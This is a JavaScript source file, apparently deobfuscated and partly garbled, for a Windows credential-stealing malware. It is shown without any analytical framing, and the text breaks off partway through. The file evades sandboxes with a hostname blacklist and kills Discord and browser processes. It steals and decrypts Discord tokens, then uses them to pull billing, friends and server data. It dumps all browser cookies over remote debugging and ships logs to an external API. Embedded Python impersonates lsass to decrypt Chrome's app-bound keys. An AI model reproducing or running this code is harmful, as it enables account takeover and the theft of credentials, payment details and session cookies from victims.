var hostnameblack = ["373836", "Wallachebciw", "JANWIL", "Tarynorqc", "MARWAL", "HANBRO", "DESKTOP-D019GDM", "Lynnetlyel", "Zoefflz", "Hindajiox", "Opalubci", "ACOLEM", "Zoefflz", "DESKTOP-EIWAI7B", "Franciscooffc", "Luannawivg", "Annabelaooou", "Adriannaboth", "Gladmrde", "MICHEDUNCA", "Adriaensgtgh", "Nadeanzlda", "DESKTOP-D019GDM", "Gustyvogv", "Frankyrhni", "Gavinnxsr", "DESKTOP-EIWAI7B", "JUANRAMIRE", "Anallisegbpl", "DESKTOP-0000000", "Valenegrwl", "Sandextpm", "00900BC83803", "0CC47AC83803", "6C4E733F-C2D9-4", "ACEPC", "AIDANPC", "ALENMOOS-PC", "ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "COFFEE-SHOP", "COMPNAME_4047", "d1bnJkfVlH", "DESKTOP-19OLLTD", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "DESKTOP-4U8DTF8", "DESKTOP-54XGX6F", "DESKTOP-5OV9S0O", "DESKTOP-6AKQQAM", "DESKTOP-6BMFT65", "DESKTOP-70T5SDX", "DESKTOP-7AFSTDP", "DESKTOP-7XC6GEZ", "DESKTOP-8K9D93B", "DESKTOP-AHGXKTV", "DESKTOP-ALBERTO", "DESKTOP-B0T93D6", "DESKTOP-BGN5L8Y", "DESKTOP-BUGIO", "DESKTOP-BXJYAEC", "DESKTOP-CBGPFEE", "DESKTOP-CDQE7VN", "DESKTOP-CHAYANN", "DESKTOP-CM0DAW8", "DESKTOP-CNFVLMW", "DESKTOP-CRCCCOT", "DESKTOP-D019GDM", "DESKTOP-D4FEN3M", "DESKTOP-DE369SE", "DESKTOP-DIL6IYA", "DESKTOP-ECWZXY2", "DESKTOP-F7BGEN9", "DESKTOP-FSHHZLJ", "DESKTOP-G4CWFLF", "DESKTOP-GELATOR", "DESKTOP-GLBAZXT", "DESKTOP-GNQZM0O", "DESKTOP-GPPK5VQ", "DESKTOP-HASANLO", "DESKTOP-HQLUWFA", "DESKTOP-HSS0DJ9", "DESKTOP-IAPKN1P", "DESKTOP-IFCAQVL", "DESKTOP-ION5ZSB", "DESKTOP-JQPIFWD", "DESKTOP-KALVINO", "DESKTOP-KOKOVSK", "DESKTOP-NAKFFMT", "DESKTOP-NKP0I4P", "DESKTOP-NM1ZPLG", "DESKTOP-NTU7VUO", "DESKTOP-QUAY8GS", "DESKTOP-RCA3QWX", "DESKTOP-RHXDKWW", "DESKTOP-S1LFPHO", "DESKTOP-SUPERIO", "DESKTOP-V1L26J5", "DESKTOP-VIRENDO", "DESKTOP-VKNFFB6", "DESKTOP-VRSQLAG", "DESKTOP-VWJU7MF", "DESKTOP-VZ5ZSYI", "DESKTOP-W8JLV9V", "DESKTOP-WG3MYJS", "DESKTOP-WI8CLET", "DESKTOP-XOY7MHS", "DESKTOP-Y8ASUIL", "DESKTOP-YW9UO1H", "DESKTOP-ZJF9KAN", "DESKTOP-ZMYEHDA", "DESKTOP-ZNCAEAM", "DESKTOP-ZOJJ8KL", "DESKTOP-ZV9GVYL", "DOMIC-DESKTOP", "EA8C2E2A-D017-4", "ESPNHOOL", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg", "JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUDES-DOJO", "JULIA-PC", "LANTECH-LLC", "LISA-PC", "LOUISE-PC", "LUCAS-PC", "MIKE-PC", "NETTYPC", "ORELEEPC", "ORXGKKZC", "Paul Jones", "PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "SERVER-PC", "SERVER1", "Steve", "SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "VONRAHEL", "WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG", "WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG", "WINZDS-VQH86L5D", "WORK", "XC64ZB", "XGNSVODU", "ZELJAVA", "3CECEFC83806", "C81F66C83805", "DESKTOP-USLVD7G", "DESKTOP-AUPFKSY", "DESKTOP-RP4FIBL", "DESKTOP-6UJBD2J", "DESKTOP-LTMCKLA", "DESKTOP-FLTWYYU", "DESKTOP-WA2BY3L", "DESKTOP-UBDJJ0A", "DESKTOP-KXP5YFO", "DESKTOP-DAU8GJ2", "DESKTOP-FCRB3FM", "DESKTOP-VYRNO7M", "DESKTOP-PKQNDSR", "DESKTOP-SCNDJWE", "DESKTOP-RSNLFZS", "DESKTOP-MWFRVKH", "DESKTOP-QLN2VUF", "DESKTOP-62YPFIQ", "DESKTOP-PA0FNV5", "DESKTOP-B9OARKC", "DESKTOP-J5XGGXR", "DESKTOP-JHUHOTB", "DESKTOP-64ACUCH", "DESKTOP-SUNDMI5", "DESKTOP-GCN6MIO", "FERREIRA-W10", "DESKTOP-MJC6500", "DESKTOP-WS7PPR2", "DESKTOP-XWQ5FUV", "DESKTOP-UHHSY4R", "DESKTOP-ZJRWGX5", "DESKTOP-ZYQYSRD", "WINZDS-MILOBM35", "DESKTOP-K8Y2SAM", "DESKTOP-4GCZVJU", "DESKTOP-O6FBMF7", "DESKTOP-WDT1SL6", "EIEEIFYE", "CRYPTODEV222222", "EFA0FDEC-8FA7-4"];
const isBlacklisted = pcuserblack.includes(os.userInfo().username) || hostnameblack.includes(os.hostname()) || hwidblack.includes(hwid);
if (isBlacklisted) {
    process.exit(0);
}
function copyRecursive(src, dest) {
    if (!fs.existsSync(Dpapi)) {
        fs.mkdirSync(Dpapi, {
            recursive: true
        });
    }
    const entries = fs.readdirSync(src);
    for (const entry of entries) {
        const fullSrcPath = path.join(src, entry);
        const fullDestPath = path.join(dest, entry);
        try {
            if (fs.statSync(fullSrcPath).isDirectory()) {
                copyRecursive(fullSrcPath, fullDestPath);
            } else {
                fs.copyFileSync(fullSrcPath, fullDestPath);
            }
        } catch (os) { }
    }
}
async function Sleep(fs) {
    return new Promise(path => {
        return setTimeoutFn(path, fs);
    });
}
function getLogFilePath() {
    return path.join(appdata, "EVIL-LIFETIME-8B8D85732A0A.log");
}
async function writeLogToFile(path, crypto) {
    try {
        if (!crypto || typeof crypto !== "string" || crypto.trim().length === 0) {
            return;
        }
        const Dpapi = new Date().toISOString();
        const FormData = "[" + Dpapi + "] [" + path.toUpperCase() + "] " + crypto + "\n";
        const axios = path.join(appdata, "EVIL-LIFETIME-8B8D85732A0A.log");
        if (!fs.existsSync(appdata)) {
            fs.mkdirSync(appdata, {
                recursive: true
            });
        }
        fs.appendFileSync(axios, FormData, "utf8");
    } catch (https) { }
}
async function sendLogsToAPI() {
    try {
        const path = path.join(appdata, "EVIL-LIFETIME-8B8D85732A0A.log");
        if (!fs.existsSync(path)) {
            return;
        }
        const crypto = fs.readFileSync(path, "utf8");
        if (!crypto || crypto.trim().length === 0) {
            return;
        }
        await axios.post("http://api_patched/send-logs", {
            key: "EVIL-LIFETIME-8B8D85732A0A",
            logs: crypto
        }, {
            headers: getApiHeaders(),
            timeout: 5000
        });
        fs.writeFileSync(path, "", "utf8");
    } catch (Dpapi) { }
}
async function killAllDiscords() {
    try {
        if (process.platform !== "win32") {
            return;
        }
        const fs = ["discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe"];
        for (const path of fs) try {
            execSync("taskkill /F /IM " + path, {
                stdio: "pipe",
                timeout: 10000,
                windowsHide: true
            });
        } catch (crypto) { }
    } catch (crypto) { }
}
if (!SendLogs.logCount) {
    SendLogs.logCount = 0;
}
async function SendLogs(fs, ...path) {
    const crypto = path.map(fs => {
        return typeof fs === "string" ? fs : JSON.stringify(fs, null, 2);
    }).join(" ").trim();
    if (!crypto || crypto.length === 0) {
        return;
    }
    await writeLogToFile(fs, crypto);
    SendLogs.logCount = (SendLogs.logCount || 0) + 1;
    if (!SendLogs.sendTimer) {
        SendLogs.sendTimer = setTimeoutFn(async () => {
            await sendLogsToAPI();
            SendLogs.sendTimer = null;
            SendLogs.logCount = 0;
        }, 30000);
    }
    if (SendLogs.logCount >= 10) {
        if (SendLogs.sendTimer) {
            clearTimeoutFn(SendLogs.sendTimer);
        }
        SendLogs.sendTimer = null;
        SendLogs.logCount = 0;
        await sendLogsToAPI();
    }
}
["log", "exclusion", "debug", "limpeza", "warn", "error"].forEach(fs => {
    const path = console[fs];
    console[fs] = async (...crypto) => {
        path.apply(console, crypto);
        await SendLogs(fs, ...crypto);
    };
});
async function FindToken(path, FormData) {
    const leveldbPath = path + "Local Storage\\leveldb";
    if (!path.includes("discord")) {
        try {
            fs.readdirSync(leveldbPath).map(path => {
                if (path.endsWith(".log") || path.endsWith(".ldb")) {
                    fs.readFileSync(leveldbPath + "\\" + file, "utf8").split(new RegExp("\\r?\\n", "")).forEach(path => {
                        const regexes = [new RegExp(new RegExp("mfa\\.[\\w-]{84}", "g")), new RegExp(new RegExp("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", "g"))];
                        for (const reg of regexes) {
                            const matches = line.match(reg);
                            if (http && http.length) {
                                http.forEach(path => {
                                    if (!tokens.find(axios => {
                                        return axios.token === path;
                                    })) {
                                        tokens.push({
                                            token: path,
                                            location: FormData
                                        });
                                    }
                                });
                            }
                        }
                    });
                }
            });
        } catch (http) { }
    } else {
        const localStatePath = path + "\\Local State";
        if (!fs.existsSync(os)) {
            return;
        }
        try {
            fs.readdirSync(leveldbPath).map(path => {
                if (path.endsWith(".log") || path.endsWith(".ldb")) {
                    fs.readFileSync(leveldbPath + "\\" + file, "utf8").split(new RegExp("\\r?\\n", "")).forEach(path => {
                        const encTokenRegex = new RegExp(new RegExp("dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\']*", "g"));
                        const matches = line.match(encTokenRegex);
                        if (https) {
                            https.forEach(path => {
                                try {
                                    const localStateData = JSON.parse(fs.readFileSync(localStatePath));
                                    const encryptedKey = Buffer.from(localStateData.os_crypt.encrypted_key, "base64").subarray(5);
                                    const masterKey = Dpapi.unprotectData(Buffer.from(encryptedKey, "utf-8"), null, "CurrentUser");
                                    const tokenBuffer = Buffer.from(line.split("dQw4w9WgXcQ:")[1], "base64");
                                    const iv = tokenBuffer.slice(3, 15);
                                    const encryptedData = tokenBuffer.slice(15, tokenBuffer.length - 16);
                                    const authTag = tokenBuffer.slice(tokenBuffer.length - 16, tokenBuffer.length);
                                    const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
                                    decipher.setAuthTag(authTag);
                                    const decryptedToken = decipher.update(encryptedData, "base64", "utf-8") + spawn.final("utf-8");
                                    if (!tokens.find(path => {
                                        return path.token === WebSocket;
                                    })) {
                                        tokens.push({
                                            token: WebSocket,
                                            location: FormData
                                        });
                                    }
                                } catch (StreamZip) { }
                            });
                        }
                    });
                }
            });
        } catch (http) { }
    }
}
async function GetIp() {
    const fs = await axios.get("https://www.myexternalip.com/raw")["catch"](() => {
        return null;
    });
    return fs?.data || "None";
}
function formatSize(fs) {
    if (!fs || fs < 0) {
        return "0 B";
    }
    const path = ["B", "KB", "MB", "GB", "TB"];
    let crypto = fs;
    let Dpapi = 0;
    while (crypto >= 1024 && Dpapi < path.length - 1) {
        crypto /= 1024;
        Dpapi++;
    }
    return "" + crypto.toFixed(2) + " " + path[Dpapi];
}
function FolderTree(dirPath, indent = "") {
    let output = "";
    try {
        const files = fs.readdirSync(dirPath);
        const directories = [];
        const plainFiles = [];
        for (const file of files) try {
            const fullPath = path.join(dirPath, file);
            if (fs.statSync(fullPath).isDirectory()) {
                https.push(os);
            } else {
                http.push(os);
            }
        } catch {
            continue;
        }
        const sqlite3 = [...https, ...http];
        sqlite3.forEach((axios, https) => {
            try {
                const http = path.join(crypto, axios);
                const exec = https === sqlite3.length - 1;
                const execSync = exec ? "└─ " : "├─ ";
                const execFile = Dpapi + (exec ? "   " : "│  ");
                let spawn = "";
                const WebSocket = fs.statSync(http);
                if (WebSocket.isDirectory()) {
                    spawn = " ";
                    FormData += "" + Dpapi + execSync + "📁 " + axios + " " + spawn + "\n";
                    FormData += FolderTree(http, execFile);
                } else {
                    spawn = "- (" + formatSize(WebSocket.size) + ")";
                    FormData += "" + Dpapi + execSync + "📄 " + axios + " " + spawn + "\n";
                }
            } catch {
                return;
            }
        });
    } catch {
        return FormData;
    }
    return FormData;
}
function GetRareBadges(fs) {
    if (typeof fs !== "number") {
        return "";
    }
    let path = "";
    for (const crypto in badges) {
        const Dpapi = badges[crypto];
        if ((fs & Dpapi.id) === Dpapi.id && Dpapi.rare) {
            path += Dpapi.emoji;
        }
    }
    return path;
}
async function CurrentNitro(fs) {
    if (!fs) {
        return {
            badge: null,
            current: null
        };
    }
    const path = new Date();
    const crypto = new Date(fs);
    const Dpapi = path.getFullYear() - crypto.getFullYear();
    const FormData = path.getMonth() - crypto.getMonth();
    let axios = Dpapi * 12 + FormData;
    if (path.getDate() < crypto.getDate()) {
        axios -= 1;
    }
    const https = [{
        badge: "nitro",
        lowerLimit: 0,
        upperLimit: 0
    }, {
        badge: "nitro_bronze",
        lowerLimit: 1,
        upperLimit: 2
    }, {
        badge: "nitro_silver",
        lowerLimit: 3,
        upperLimit: 5
    }, {
        badge: "nitro_gold",
        lowerLimit: 6,
        upperLimit: 11
    }, {
        badge: "nitro_platinum",
        lowerLimit: 12,
        upperLimit: 23
    }, {
        badge: "nitro_diamond",
        lowerLimit: 24,
        upperLimit: 35
    }, {
        badge: "nitro_emerald",
        lowerLimit: 36,
        upperLimit: 59
    }, {
        badge: "nitro_ruby",
        lowerLimit: 60,
        upperLimit: 71
    }, {
        badge: "nitro_opal",
        lowerLimit: 72
    }];
    const http = https.find(fs => {
        const path = axios >= fs.lowerLimit;
        const crypto = typeof fs.upperLimit === "undefined" || axios <= fs.upperLimit;
        return path && crypto;
    });
    return {
        badge: http?.badge || null,
        current: fs
    };
}
async function GetBadges(fs, path) {
    const crypto = await axios.get("https://discord.com/api/v10/users/" + fs + "/profile", {
        headers: {
            "Content-Type": "application/json",
            authorization: path
        }
    }).then(fs => {
        return fs.data;
    })["catch"](() => {
        return null;
    });
    if (!crypto || !Array.isArray(crypto.badges)) {
        return "`None`";
    }
    if (!crypto.badges.length) {
        return "`No Badges`";
    }
    const Dpapi = crypto.badges.map(fs => {
        return fs.id;
    });
    const FormData = await CurrentNitro(crypto.premium_since);
    if (FormData.badge) {
        Dpapi.unshift(FormData.badge);
    }
    return Dpapi.length ? Dpapi.map(path => {
        return badges[path]?.emoji;
    }).filter(Boolean).join("") : "`No Badges`";
}
async function GetBilling(fs) {
    const path = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            authorization: fs
        }
    }).then(fs => {
        return fs.data;
    })["catch"](() => {
        return null;
    });
    if (!path || !Array.isArray(path)) {
        return "`None`";
    }
    if (!path.length) {
        return "`No Billing`";
    }
    let result = "";
    for (const Dpapi of path) if (Dpapi.type == 2 && Dpapi.invalid != true) {
        crypto += "<:paypal:1367518269719969873>";
    } else {
        if (Dpapi.type == 1 && Dpapi.invalid != true) {
            crypto += "<:card:1367518257241915483>";
        }
    }
    return crypto || "`No Billing`";
}
async function GetFriends(fs) {
    const path = await axios.get("https://discord.com/api/v9/users/@me/relationships", {
        headers: {
            authorization: fs
        }
    }).then(fs => {
        return fs.data;
    })["catch"](() => {
        return null;
    });
    if (!path || !Array.isArray(path)) {
        return "*Account Locked*";
    }
    if (!path.length) {
        return "*No Rare Friends*";
    }
    const crypto = path.filter(fs => {
        return fs.type == 1;
    });
    let Dpapi = "";
    for (const FormData of crypto) {
        const https = GetRareBadges(FormData.user.public_flags);
        const http = FormData.user.username.length === 3;
        const os = http ? "<:3c:1365004856103796897>" : "";
        if (https) {
            Dpapi += "" + os + https + " | `" + FormData.user.username + "`\n";
        } else {
            if (http) {
                Dpapi += "" + os + " | `" + FormData.user.username + "`\n";
            }
        }
    }
    return {
        length: crypto.length,
        users: Dpapi || "*No Rare Friends*"
    };
}
async function GetGuilds(fs) {
    try {
        const path = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
            headers: {
                "Content-Type": "application/json",
                authorization: fs
            }
        }).then(fs => {
            return fs.data;
        })["catch"](() => {
            return null;
        });
        const crypto = path.filter(fs => {
            return fs.owner === true || fs.permissions === 562949953421311;
        });
        if (crypto.length === 0) {
            return "*Nothing to see here!*";
        }
        let Dpapi = "\n";
        for (const FormData of crypto) {
            const https = FormData.owner ? "<:starzap:1376338577268412486>" : "🛠️";
            Dpapi += "" + https + " | `" + FormData.name + " - Members: " + FormData.approximate_member_count + "`\n";
            if (Dpapi.length >= 1024) {
                return "`Too many servers to display.`";
            }
        }
        return Dpapi;
    } catch (http) { }
}
function getBrowserExecutable(path) {
    const crypto = browserConfigs[path];
    if (!crypto) {
        return null;
    }
    if (fs.existsSync(crypto.bin)) {
        return crypto.bin;
    }
    if (crypto.binAlt && fs.existsSync(crypto.binAlt)) {
        return crypto.binAlt;
    }
    return null;
}
function browserExists(fs) {
    return getBrowserExecutable(fs) !== null;
}
async function killAllBrowsers() {
    const fs = ["msedge.exe", "brave.exe", "vivaldi.exe", "browser.exe", "chrome.exe", "chromium.exe", "torch.exe", "kometa.exe", "orbitum.exe", "7star.exe", "sputnik.exe", "epic.exe", "uran.exe", "iridium.exe", "amigo.exe", "opera.exe"];
    await Promise.all(fs.map(fs => {
        return new Promise(path => {
            return exec("taskkill /F /IM " + fs + " /T", () => {
                return path();
            });
        });
    }));
    await Sleep(2000);
}
async function startBrowserDebug(fs) {
    const path = browserConfigs[fs];
    if (!path) {
        return null;
    }
    const crypto = getBrowserExecutable(fs);
    if (!crypto) {
        return null;
    }
    const Dpapi = Math.floor(Math.random() * 55536) + 10000;
    const FormData = fs === "opera" || fs === "operagx";
    const axios = ["--remote-debugging-port=" + Dpapi, "--user-data-dir=\"" + path.userData + "\"", "--no-sandbox", FormData ? "--headless" : "--headless=new", "--disable-gpu", "--disable-extensions", "--disable-background-networking"];
    const https = spawn("\"" + crypto + "\"", axios, {
        shell: true,
        windowsHide: true
    });
    https.stdout.on("data", () => { });
    https.stderr.on("data", () => { });
    https.on("error", () => { });
    await Sleep(FormData ? 5000 : 4000);
    return {
        browserProcess: https,
        randomPort: Dpapi,
        name: path.name
    };
}
async function getDebugWsUrl(fs) {
    const path = "http://127.0.0.1:" + fs + "/json";
    let crypto = 5;
    while (crypto > 0) {
        try {
            const Dpapi = await axios.get(path, {
                timeout: 3000
            });
            const FormData = Dpapi.data;
            if (FormData && FormData.length > 0) {
                return FormData[0]?.webSocketDebuggerUrl || null;
            }
        } catch {
            await Sleep(1500);
            crypto--;
        }
    }
    return null;
}
async function getCookiesWS(fs) {
    return new Promise((path, crypto) => {
        const Dpapi = new WebSocket(fs);
        const FormData = setTimeoutFn(() => {
            Dpapi.close();
            crypto(new Error("Timeout"));
        }, 15000);
        Dpapi.on("open", () => {
            Dpapi.send(JSON.stringify({
                method: "Network.getAllCookies",
                id: 1
            }));
        });
        Dpapi.on("message", crypto => {
            const fs = JSON.parse(crypto);
            if (fs.id === 1 && fs.result) {
                if (FormData) {
                    clearTimeoutFn(FormData);
                }
                path(fs.result.cookies);
                Dpapi.close();
            }
        });
        Dpapi.on("error", path => {
            if (FormData) {
                clearTimeoutFn(FormData);
            }
            crypto(path);
        });
    });
}
async function processBrowser(fs) {
    const path = browserConfigs[fs];
    if (!path || !(getBrowserExecutable(fs) !== null)) {
        return null;
    }
    const crypto = await startBrowserDebug(fs);
    if (!crypto) {
        return null;
    }
    const {
        browserProcess: Dpapi,
        randomPort: FormData,
        name: axios
    } = crypto;
    const https = await getDebugWsUrl(FormData);
    if (!https) {
        Dpapi.kill();
        return null;
    }
    try {
        const http = await getCookiesWS(https);
        Dpapi.kill();
        if (http && http.length > 0) {
            return {
                browser: axios,
                cookies: http
            };
        }
    } catch (os) {
        console.error("[BROWSER] Erro ao processar " + axios + ":", os.message);
    }
    Dpapi.kill();
    return null;
}
function SaveCookies(crypto) {
    if (!fs.existsSync(cookiesOutputDir)) {
        fs.mkdirSync(cookiesOutputDir, {
            recursive: true
        });
    }
    for (const [FormData, axios] of Object.entries(crypto)) for (const [https, http] of Object.entries(axios)) {
        const os = path.join(cookiesOutputDir, "" + FormData + "_" + https + ".txt");
        const archiver = http.map(crypto => {
            const Dpapi = crypto.domain || "";
            const FormData = crypto.name || "";
            const axios = (crypto.value || "").replace(new RegExp("[\\r\\n\\t]", "g"), "");
            const https = crypto.path || "/";
            const http = crypto.expires || "2597573456";
            const os = Dpapi.startsWith(".") ? "TRUE" : "FALSE";
            return "" + Dpapi + "\t" + os + "\t" + https + "\tFALSE\t" + http + "\t" + FormData + "\t" + axios;
        }).join("\n");
        fs.writeFileSync(os, archiver);
    }
    return cookiesOutputDir;
}
async function checkPythonExists() {
    if (!fs.existsSync(pythonExe)) {
        return false;
    }
    const crypto = path.join(pyInstallDir, "tools", "Lib", "encodings");
    if (!fs.existsSync(crypto)) {
        return false;
    }
    try {
        const Dpapi = execSync("\"" + pythonExe + "\" --version", {
            encoding: "utf-8",
            timeout: 5000
        });
        return Dpapi.includes("Python 3");
    } catch {
        return false;
    }
}
function checkChromeInstalled() {
    const crypto = [path.join(localappdata, "Google", "Chrome", "User Data"), path.join(localappdata, "Google", "Chrome SxS", "User Data")];
    return crypto.some(crypto => {
        return fs.existsSync(path.join(crypto, "Local State"));
    });
}
function downloadPythonFile(path, crypto) {
    return new Promise((Dpapi, FormData) => {
        const axios = fs.createWriteStream(crypto);
        const os = path.startsWith("https") ? https : http;
        const archiver = {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        };
        os.get(path, archiver, os => {
            if (os.statusCode !== 200) {
                axios.close();
                try {
                    fs.unlinkSync(crypto);
                } catch { }
                return FormData(new Error("Download failed: " + os.statusCode));
            }
            os.pipe(axios);
            axios.on("finish", () => {
                axios.close();
                const os = fs.statSync(crypto);
                if (os.size === 0) {
                    try {
                        fs.unlinkSync(crypto);
                    } catch { }
                    return FormData(new Error("Empty file"));
                }
                Dpapi();
            });
        }).on("error", Dpapi => {
            axios.close();
            fs.unlink(crypto, () => {
                return FormData(Dpapi);
            });
        });
    });
}
function runPythonCode(fs, path) {
    return new Promise((crypto, Dpapi) => {
        const FormData = spawn(pythonExe, ["-u", "-"], {
            env: path,
            stdio: ["pipe", "pipe", "pipe"]
        });
        let axios = "";
        FormData.stdout.on("data", crypto => {
            return process.stdout.write(crypto.toString());
        });
        FormData.stderr.on("data", crypto => {
            axios += crypto.toString();
        });
        FormData.on("close", FormData => {
            if (FormData === 0) {
                crypto();
            } else {
                Dpapi(new Error("Python exit " + FormData));
            }
        });
        FormData.on("error", Dpapi);
        FormData.stdin.write(fs, "utf8");
        FormData.stdin.end();
    });
}
const pythonCodeV20 = "\nimport os, io, sys, json, struct, ctypes, sqlite3, pathlib, binascii, time, base64, shutil, subprocess\nfrom contextlib import contextmanager\nfrom ctypes import Structure, POINTER, c_void_p, c_uint, c_int, c_char_p, cast\nimport windows, windows.security, windows.crypto\nimport windows.generated_def as gdef\nfrom Crypto.Cipher import AES, ChaCha20_Poly1305\n\nidentifier = \"" + identifier + "\"\ntemp_dir = os.path.join(os.environ.get(\"TEMP\", os.path.expandvars(\"%TEMP%\")), identifier)\nos.makedirs(temp_dir, exist_ok=True)\noutput_dir = pathlib.Path(temp_dir)\n\nclass SECItem(Structure):\n    _fields_ = [\n        ('type', c_uint),\n        ('data', c_void_p),\n        ('len', c_uint)\n    ]\n\ndef is_admin():\n    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0\n    except: return False\n\n@contextmanager\ndef impersonate_lsass():\n    original_token = windows.current_thread.token\n    try:\n        windows.current_process.token.enable_privilege(\"SeDebugPrivilege\")\n        proc = next(p for p in windows.system.processes if p.name.lower() == \"lsass.exe\")\n        impersonation_token = proc.token.duplicate(type=gdef.TokenImpersonation, impersonation_level=gdef.SecurityImpersonation)\n        windows.current_thread.token = impersonation_token\n        yield\n    finally:\n        windows.current_thread.token = original_token\n\ndef parse_key_blob(blob_data):\n    buffer = io.BytesIO(blob_data)\n    parsed = {}\n    header_len = struct.unpack('<I', buffer.read(4))[0]\n    parsed['header'] = buffer.read(header_len)\n    content_len = struct.unpack('<I', buffer.read(4))[0]\n    assert header_len + content_len + 8 == len(blob_data)\n    parsed['flag'] = buffer.read(1)[0]\n    if parsed['flag'] in [1, 2]:\n        parsed['iv'] = buffer.read(12)\n        parsed['ciphertext'] = buffer.read(32)\n        parsed['tag'] = buffer.read(16)\n    elif parsed['flag'] == 3:\n        parsed['encrypted_aes_key'] = buffer.read(32)\n        parsed['iv'] = buffer.read(12)\n        parsed['ciphertext'] = buffer.read(32)\n        parsed['tag'] = buffer.read(16)\n    else:\n        parsed['raw_data'] = buffer.read()\n    return parsed\n\ndef decrypt_with_cng(input_data, key_name=\"Google Chromekey1\"):\n    ncrypt = ctypes.windll.NCRYPT\n    hProvider = gdef.NCRYPT_PROV_HANDLE()\n    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), \"Microsoft Software Key Storage Provider\", 0)\n    if status != 0: return None\n    hKey = gdef.NCRYPT_KEY_HANDLE()\n    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)\n    if status != 0:\n        ncrypt.NCryptFreeObject(hProvider)\n        return None\n    pcbResult = gdef.DWORD(0)\n    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)\n    ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)\n    output_buffer = (ctypes.c_ubyte * pcbResult.value)()\n    ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, pcbResult.value, ctypes.byref(pcbResult), 0x40)\n    ncrypt.NCryptFreeObject(hKey)\n    ncrypt.NCryptFreeObject(hProvider)\n    return bytes(output_buffer[:pcbResult.value])\n\ndef derive_v20_master_key(parsed, key_name=\"Google Chromekey1\"):\n    if parsed['flag'] == 1:\n        aes_key = bytes.fromhex(\"B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787\")\n        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed['iv'])\n        return cipher.decrypt_and_verify(parsed['ciphertext'], parsed['tag'])\n    elif parsed['flag'] == 2:\n        chacha20_key = bytes.fromhex(\"E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660\")\n        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed['iv'])\n        return cipher.decrypt_and_verify(parsed['ciphertext'], parsed['tag'])\n    elif parsed['flag'] == 3:\n        xor_key = bytes.fromhex(\"CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390\")\n        with impersonate_lsass():\n            decrypted_aes_key = decrypt_with_cng(parsed['encrypted_aes_key'], key_name)\n        if not decrypted_aes_key:\n            return None\n        xored_aes_key = bytes([a^b for a,b in zip(decrypted_aes_key, xor_key)])\n        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed['iv'])\n        return cipher.decrypt_and_verify(parsed['ciphertext'], parsed['tag'])\n    else:\n        return parsed.get('raw_data', b'')\n\ndef get_master_key_chrome(local_state_path):\n    \"\"\"Obtém master key usando App-Bound Encryption (para Chrome)\"\"\"\n    try:\n        with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\n            local_state = json.load(f)\n        \n        if \"os_crypt\" in local_state and \"app_bound_encrypted_key\" in local_state[\"os_crypt\"]:\n            key_blob_encrypted = binascii.a2b_base64(local_state[\"os_crypt\"][\"app_bound_encrypted_key\"])[4:]\n        elif \"os_crypt\" in local_state and \"encrypted_key\" in local_state[\"os_crypt\"]:\n            key_blob_encrypted = binascii.a2b_base64(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n            return windows.crypto.dpapi.unprotect(key_blob_encrypted)\n        else:\n            return None\n            \n        with impersonate_lsass():\n            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)\n        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)\n        parsed_data = parse_key_blob(key_blob_user_decrypted)\n        \n        if parsed_data['flag'] not in (1, 2, 3):\n            return key_blob_user_decrypted[-32:]\n            \n        return derive_v20_master_key(parsed_data, \"Google Chromekey1\")\n    except:\n        return None\n\ndef get_master_key_brave(local_state_path):\n    \"\"\"Obtém master key do Brave\"\"\"\n    try:\n        with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\n            local_state = json.load(f)\n        if \"os_crypt\" in local_state and \"app_bound_encrypted_key\" in local_state[\"os_crypt\"]:\n            key_blob_encrypted = binascii.a2b_base64(local_state[\"os_crypt\"][\"app_bound_encrypted_key\"])[4:]\n        elif \"os_crypt\" in local_state and \"encrypted_key\" in local_state[\"os_crypt\"]:\n            key_blob_encrypted = binascii.a2b_base64(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n            return 